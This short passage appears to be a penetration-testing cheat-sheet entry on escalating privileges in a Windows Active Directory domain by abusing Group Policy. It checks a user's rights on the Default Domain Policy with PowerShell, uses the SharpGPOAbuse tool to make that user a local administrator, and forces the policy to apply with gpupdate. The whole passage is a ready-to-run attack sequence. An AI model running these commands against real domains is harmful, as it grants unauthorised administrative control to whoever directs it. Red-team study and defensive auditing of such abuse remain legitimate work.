> In PowerShell:

```
Get-GPPermission -Name "Default Domain Policy" -TargetName "<username>" -TargetType User
```

> Look for the permission: GpoEditDeleteModifySecurity on default domain policy. Based on this we could make our current user a local admin:

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <username> --GPOName "Default Domain Policy"
```

> Now we can force the GPO to update:

```
gpupdate /force
```

